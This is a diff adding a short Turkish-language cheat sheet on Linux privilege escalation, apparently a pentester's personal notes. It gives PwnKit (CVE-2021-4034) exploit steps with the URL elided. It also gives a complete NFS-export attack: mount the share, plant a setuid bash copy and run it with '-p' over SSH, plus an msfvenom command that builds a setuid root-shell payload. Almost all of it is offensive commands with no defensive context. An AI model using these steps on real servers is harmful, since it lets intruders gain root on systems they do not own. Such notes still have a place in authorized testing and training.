@@ -1,0 +1,41 @@
+#"Privesc-Ricki"
+Yetki yükseltme aşamaları için Omuz sörfü vs görürsen ilk deneyeceğin nokta
+sudo -i olmalıdır.
+--
+İlk önce nmap ile tarayıp, SSH ile sunucuya girmelisin.
+#Örnek Pkexec
+Pwnkit CVE-2021-4034
+cd /tmp
+git clone https://.../CVE
+make
+./cve-2021....
+you root
+----
+"nfscommonprivesc"
+nfscommon yetki yükseltme
+ilk önce SSH ile sunucuya bağlan,
+
+nmap -sV -p 2049 IP/24
+sudo apt-get install nfs-common
+showmount -e Target_IP bunun sonucunda dizinler gözükür.
+nmap -sV --script=nfs-showmount Target IP -> Check edebilirsin.
+mdkir /tmp/nfs -> Kendi cihazında çalıştır.
+
+1.Yol
+sudo mount -t nfs IP/home /tmp/nfs -> Kendi cihazında yer alan /tmp/nfs'i karşı tarafa mount ettin
+sudo cp /bin/bash .
+sudo chmod +s bash
+
+ssh ubuntu@10.10.10.10
+cd home
+./bash -p
+-Root
+
+2.Yol
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf  
+chmod +s shell.elf
+ssh sonrası ./shell.elf ile çalıştır. Root'sun
+
+
+find / -name "a.txt"
+
